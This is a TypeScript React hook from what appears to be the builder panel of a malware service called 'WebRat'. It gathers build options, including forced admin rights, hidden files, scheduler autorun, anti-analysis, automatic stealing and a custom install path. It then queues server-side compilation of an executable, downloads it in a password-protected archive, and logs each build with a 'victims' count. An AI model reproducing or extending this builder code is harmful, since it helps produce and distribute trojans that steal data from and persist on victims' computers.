import { useCallback, useRef } from "react";

import { resolveAccountLogin } from "../services/get-account-login";
import { downloadCompileResult, enqueueCompileGoFromConfig, waitCompileDone } from "../services/compile-go-config";
import { downloadBlob } from "../utils/download-blob";
import { getLastBuildTimestamp, setLastBuildTimestamp } from "../utils/last-build-ts";
import { openBuildModal } from "../utils/build-modal";
import { generateArchivePassword, generateBuildId } from "../utils/build-ids";
import { showToastSafe } from "../utils/toast";

import type { BuildHistoryItem } from "./build-flow/types";
import { formatCreated } from "./build-flow/format-created";
import {
    clearActiveBuild,
    dedupeHistoryByBuildId,
    loadBuildsHistory,
    saveActiveBuild,
    saveBuildsHistory,
} from "./build-flow/storage";
import { resetBuilderDefaults, setBuildingUi } from "./build-flow/ui";

export function useBuilderBuildFlow(opts: {
    iconBase64: string;
    setIconBase64: (v: string) => void;
    delay: number;
    setDelay: (v: number) => void;
    setInstallMode: (v: string) => void;
}) {
    const { iconBase64, setIconBase64, delay, setDelay, setInstallMode } = opts;

    const buildingRef = useRef(false);
    const abortRef = useRef<AbortController | null>(null);

    const cancelBuild = useCallback(() => {
        if (abortRef.current) {
            abortRef.current.abort();
            abortRef.current = null;
        }
        buildingRef.current = false;

        let login = "";
        try {
            login = String(localStorage.getItem("webrat_login") || "").trim();
        } catch { }
        if (login) {
            try { clearActiveBuild(login); } catch { }
        }

        fetch("/api/compile-cancel", {
            method: "POST",
            credentials: "same-origin",
            headers: { ...csrfHeaders() },
        }).catch(() => {});

        setBuildingUi(false, "");
    }, []);

    const startBuild = useCallback(async () => {
        if (buildingRef.current) return;

        const COOLDOWN_MS = 40 * 1000;
        const nowTs = Date.now();

        let login = "";
        try {
            login = String(localStorage.getItem("webrat_login") || "").trim();
        } catch {
            login = "";
        }

        const lastTs = getLastBuildTimestamp(login);
        if (lastTs && nowTs - lastTs < COOLDOWN_MS) {
            const remainingMs = COOLDOWN_MS - (nowTs - lastTs);
            const remainingSec = Math.max(1, Math.ceil(remainingMs / 1000));
            try {
                window.WebRatCommon?.showToast?.("warning", `Please waiting ${remainingSec} seconds`);
            } catch {
                showToastSafe("warning", `Please waiting ${remainingSec} seconds`);
            }
            return;
        }

        const buildNameEl = document.getElementById("buildName") as HTMLInputElement | null;
        const buildCommentEl = document.getElementById("buildComment") as HTMLInputElement | null;
        const forceAdminEl = document.getElementById("forceAdmin") as HTMLSelectElement | null;
        const installModeEl = document.getElementById("installMode") as HTMLSelectElement | null;
        const installPathEl = document.getElementById("installPath") as HTMLInputElement | null;

        const hideFilesEl = document.getElementById("hideFiles") as HTMLInputElement | null;
        const autorunEl = document.getElementById("autorun") as HTMLSelectElement | null;

        const rawName = String(buildNameEl?.value || "").trim();
        if (!rawName) {
            showToastSafe("warning", "Enter exe name!");
            return;
        }
        if (rawName.length > 255) {
            if (buildNameEl) buildNameEl.value = rawName.slice(0, 255);
            return;
        }
        if (!/^[A-Za-zА-Яа-яЁё0-9_-]+$/.test(rawName)) {
            showToastSafe("warning", "Use only letters, numbers, - and _ for exe name!");
            return;
        }

        const buildsHistory = loadBuildsHistory(login);
        if (buildsHistory.length >= 30) {
            showToastSafe("warning", "You cannot create more than 30 exe!");
            return;
        }
        const duplicate = buildsHistory.some((b) => String(b.name || "").trim() === rawName);
        if (duplicate) {
            showToastSafe("warning", "You cannot create same exe name!");
            return;
        }

        const buildName = rawName;
        const buildComment = String(buildCommentEl?.value || "").trim();
        const buildId = generateBuildId();

        const forceAdmin = String(forceAdminEl?.value || "Normal").trim() || "Normal";
        const hideFiles = !!hideFilesEl?.checked;

        const installMode = String(installModeEl?.value || "random");
        let installPath = "";
        if (installMode === "custom") {
            const rawPath = String(installPathEl?.value || "").trim();
            if (!rawPath) {
                showToastSafe("error", "Please fill in the install path field");
                return;
            }
            installPath = rawPath;
        }

        const autorunMode = String(autorunEl?.value || "scheduler");

        const antiAnalysisEl = document.getElementById("antiAnalysis") as HTMLSelectElement | null;
        const autoStealEl = document.getElementById("autoSteal") as HTMLSelectElement | null;
        const antiAnalysis = String(antiAnalysisEl?.value || "None");
        const autoSteal = String(autoStealEl?.value || "Once");

        const offlineModeEl = document.getElementById("offlineMode") as HTMLSelectElement | null;
        const offlineMode = String(offlineModeEl?.value || "Enabled") === "Enabled";

        const delaySec = (() => {
            const n = parseInt(String(delay || 0), 10);
            if (!Number.isFinite(n)) return 0;
            return Math.max(1, Math.min(10, n));
        })();
        void delaySec;
        void hideFiles;
        void autorunMode;
        void installPath;

        buildingRef.current = true;
        const password = generateArchivePassword();
        const ac = new AbortController();
        abortRef.current = ac;

        setBuildingUi(true, "Build generation 0%");

        try {
            const resolved = await resolveAccountLogin();
            login = resolved;

            const created = formatCreated(new Date());

            const jobId = await enqueueCompileGoFromConfig({
                name: buildName,
                password,
                forceAdmin,
                iconBase64,
                buildId,
                comment: buildComment,
                autorunMode,
                startupDelaySeconds: delaySec,
                hideFilesEnabled: hideFiles,
                installMode,
                customInstallPath: installPath,
                antiAnalysis,
                autoSteal,
                offlineMode,
            });

            saveActiveBuild(login, {
                jobId,
                name: buildName,
                buildId,
                password,
                created,
            });

            let compileTicks = 0;
            await waitCompileDone(jobId, {
                onTick: (st) => {
                    compileTicks++;
                    const s = String(st?.status || "");
                    if (s === "running" || s === "pending") {
                        const pct = Math.min(95, Math.round(compileTicks * 4));
                        setBuildingUi(true, `Build generation ${pct}%`);
                    }
                },
                signal: ac.signal,
            });

            setBuildingUi(true, "Downloading build: 0%");
            const { blob, filename } = await downloadCompileResult(jobId, buildName, (pct) => {
                setBuildingUi(true, `Downloading build: ${Math.round(pct)}%`);
            }, ac.signal);

            downloadBlob(blob, filename);
            const buildEntry: BuildHistoryItem = { name: buildName, id: buildId, version: "0.22.2", created, victims: 0 };

            const nextHistory = dedupeHistoryByBuildId([buildEntry, ...loadBuildsHistory(login)]);
            saveBuildsHistory(login, nextHistory);

            setLastBuildTimestamp(login, nowTs);

            clearActiveBuild(login);

            resetBuilderDefaults(setIconBase64, setDelay, setInstallMode);

            setBuildingUi(false, "Building");
            openBuildModal(password);
        } catch (err) {
            if (ac.signal.aborted) return;
            setBuildingUi(false, "Building");

            try {
                clearActiveBuild(login);
            } catch {
            }

            const msg =
                err && typeof err === "object" && "message" in err
                    ? String((err as { message?: unknown }).message)
                    : String(err || "unknown error");

            if (msg.toLowerCase().includes("already in progress")) {
                showToastSafe("warning", "Build already in progress");
                return;
            }

            showToastSafe("error", `Build failed: ${msg || "unknown error"}`);
        } finally {
            buildingRef.current = false;
        }
    }, [delay, iconBase64, setDelay, setIconBase64, setInstallMode]);

    return { startBuild, cancelBuild };
}
